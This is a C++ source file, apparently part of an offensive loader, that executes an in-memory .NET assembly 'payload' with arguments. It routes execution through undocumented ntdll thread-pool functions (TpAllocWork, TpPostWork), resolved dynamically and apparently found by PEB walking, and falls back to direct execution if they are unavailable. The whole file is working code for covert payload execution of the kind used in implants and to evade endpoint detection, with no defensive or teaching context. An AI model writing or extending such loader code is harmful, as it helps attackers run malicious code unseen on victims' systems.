#include "threadpool.h"
#include "peb_walk.h"
#include "clr.h"
#include <windows.h>
#include <objbase.h>

static VOID NTAPI tp_callback(void* Instance, void* Context, void* Work) {
    (void)Instance;
    (void)Work;

    TpCallbackContext* ctx = reinterpret_cast<TpCallbackContext*>(Context);
    if (!ctx) return;

    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    ctx->success = execute_assembly(ctx->payload, ctx->payload_size, ctx->args, ctx->argc);
    CoUninitialize();
    ctx->completed = true;
}

bool execute_via_threadpool(unsigned char* payload, size_t payload_size,
                            const char** args, int argc) {
    if (!g_apis.pTpAllocWork || !g_apis.pTpPostWork || !g_apis.pTpReleaseWork) {
        return execute_assembly(payload, payload_size, args, argc);
    }

    TpCallbackContext ctx = {};
    ctx.payload = payload;
    ctx.payload_size = payload_size;
    ctx.args = args;
    ctx.argc = argc;
    ctx.success = false;
    ctx.completed = false;

    void* pWork = nullptr;
    NTSTATUS status = g_apis.pTpAllocWork(&pWork,
        reinterpret_cast<void*>(tp_callback),
        &ctx,
        nullptr);

    if (status != 0 || !pWork) {
        return execute_assembly(payload, payload_size, args, argc);
    }

    g_apis.pTpPostWork(pWork);

    while (!ctx.completed) {
        Sleep(10);
    }

    g_apis.pTpReleaseWork(pWork);

    return ctx.success;
}
